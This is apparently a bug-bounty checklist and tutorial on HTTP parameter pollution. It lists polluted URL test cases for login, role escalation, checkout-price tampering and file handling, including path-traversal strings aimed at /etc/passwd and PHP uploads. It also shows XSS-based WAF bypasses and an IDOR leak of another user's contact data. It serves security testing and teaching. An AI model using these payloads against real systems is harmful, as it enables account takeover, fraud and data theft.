
## Purpose:
Detect duplicate parameters or improperly parsed user input that leads to authentication bypass, WAF bypass, logic flaws, cache poisoning, or input validation failures.

---

## Authentication & Session Endpoint
- [ ] `/login?user=admin&user=guest`
- [ ] `/register?role=user&role=admin`
- [ ] `/forgot-password?email=attacker@x.com&email=victim@x.com`
- [ ] `/2fa?code=1234&code=0000`
- [ ] `/logout?token=abc&token=xyz`
- [ ] `/session?token=xyz&token=expired_token`
- [ ] `/sso/callback?redirect_uri=evil.com&redirect_uri=good.com`
- [ ] `/mfa/setup?step=1&step=2`
- [ ] `/otp/verify?otp=1111&otp=2222`
- [ ] `/auth?provider=google&provider=internal`

---

## Account/Profile Management
- [ ] `/profile?user_id=1&user_id=2`
- [ ] `/change-email?email=attacker@evil.com&email=victim@target.com`
- [ ] `/delete-account?confirm=yes&confirm=no`
- [ ] `/settings?dark_mode=1&dark_mode=0`
- [ ] `/update-password?password=abc&password=xyz`
- [ ] `/avatar/upload?file=avatar.jpg&file=evil.php`
- [ ] `/preferences?timezone=UTC&timezone=PST`
- [ ] `/notifications?enabled=true&enabled=false`
- [ ] `/roles?admin=false&admin=true`
- [ ] `/permissions?edit=true&edit=false`

---

## E-Commerce / Checkout Flows
- [ ] `/cart/add?item=101&item=102`
- [ ] `/cart/update?qty=1&qty=999`
- [ ] `/checkout?total=100&total=1`
- [ ] `/apply-coupon?code=XYZ&code=ABC`
- [ ] `/buy?product_id=200&product_id=1`
- [ ] `/payment?amount=0&amount=1000`
- [ ] `/shipping?method=standard&method=express`
- [ ] `/invoice?customer=abc&customer=def`
- [ ] `/subscription?plan=basic&plan=premium`
- [ ] `/wallet/topup?value=0&value=1000`

---

## API & Query Parameters
- [ ] `/api/users?id=1&id=admin`
- [ ] `/api/data?json=true&json=false`
- [ ] `/api/items?limit=10&limit=1000`
- [ ] `/search?q=abc&q=xyz`
- [ ] `/api/token?refresh=true&refresh=false`
- [ ] `/api/export?format=csv&format=json`
- [ ] `/api/filter?type=guest&type=admin`
- [ ] `/api/balance?currency=INR&currency=USD`
- [ ] `/api/upload?mime=jpg&mime=php`
- [ ] `/api/view?id=999&id=0`

---

## File Handling & Upload
- [ ] `/upload?file=img.jpg&file=img.php`
- [ ] `/download?name=doc.pdf&name=../../../etc/passwd`
- [ ] `/backup?file=config&file=../../db`
- [ ] `/export?file=valid.csv&file=malicious.exe`
- [ ] `/preview?doc=invoice.doc&doc=evil.html`
- [ ] `/report?type=pdf&type=zip`
- [ ] `/import?source=url1&source=url2`
- [ ] `/media?path=images&path=../secrets`
- [ ] `/pdfgen?template=official&template=attack`
- [ ] `/archive?target=logs&target=../../root`

---

## Common Bypass & Exploitation Patterns
- [ ] `param=value1&param=value2` → double keys
- [ ] `param[]=1&param[]=2` → array keys
- [ ] `param[0]=foo&param[1]=bar` → object/array bypass
- [ ] `param=value%00` + `param=value` → null-byte injection
- [ ] `param=value;param=value2` (semicolon injection)

---

## Test Vectors
- [ ] Check which parameter is prioritized: first or last?
- [ ] Does duplication affect security logic? (e.g. role=admin&role=user)
- [ ] Does backend parse arrays vs scalar values inconsistently?
- [ ] What happens when mixed data types are passed? (string + boolean)

---

## Tooling
- [ ] Burp Suite: Param Miner, Repeater
- [ ] HPP-Fuzzer (automated scanner)
- [ ] Custom curl/bash scripts for brute injection
- [ ] mitmproxy or Postman for manual inspection

---

## Anatomy of Parameter Pollution :
The manipulation of the value of each parameter depends on how each web technology is parsing these parameters. Some web technologies parse the first or the last occurrence of the parameter, some concatenate all the inputs and others will create an array of parameters.

<p align="center">
  <img 
    width="600"
    height="700"
    src="https://user-images.githubusercontent.com/63053441/159308061-dd00ec1d-bc07-406f-9e19-7a654ff4af54.png"
  >
</p>

## 1 - All occurrences of specific parameter :
  This means that if we parse the same name parameters like q=hello&q=”><svg/onload=alert(1)> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (q=hello&q=”><svg/onload=alert(1)>) of same name will give you an error.

<br></br>
Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100&id=101
```
Response :
```
HTTP/1.1 403
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100,101
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":"yourmail@gmail.com","phoneNumber":+91-9999999999,"email":"victim@gmail.com","phoneNumber":+91-8888888888

}
```

## 2 - First occurrence :
  First occurrence means a web application performs input validation on the first parameter which makes it vulnerable to second parameter which should be of same name.

Request :
```
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
Response :
```
HTTP/1.1 403 Forbidden
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
GET /search?q=Hello&q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private
```
In the above mentioned polluted request only the first occurrence (q=Hello) is checked and the last occurrence (q=”><svg/onload=alert(1)>) is not sanitized which means it will trigger XSS.


## 3 - Last occurrence :
  Last occurrence means a web application performs input validation on the last parameter which makes it vulnerable to first parameter which should be of same name.
  
Request :
```
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
Response :
```
HTTP/1.1 403 Forbidden
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
GET /search?q="><svg/onload=alert(1)>&q=Hello HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private
```
In the above mentioned polluted request only the last occurrence (q=Hello) is checked and the first occurrence (q="><svg/onload=alert(1)>) is not sanitized which means it will trigger XSS.

## 4 - Becomes an array :
  Becomes an array means whatever the input is sent from the client side the server parsed it into an array and displays it. Which means the parameter which you are polluting has an array as datatype, which is also the most vulnerable.
  
Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100
```
Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":["yourmail@gmail.com"],"phoneNumber":[+91-9999999999]

}
```
HTTP Parameter Pollution Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100&id=101
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":["yourmail@gmail.com","victim@gmail.com"],"phoneNumber":[+91-9999999999,+91-8888888888]

}
```
#### Refrences: https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02
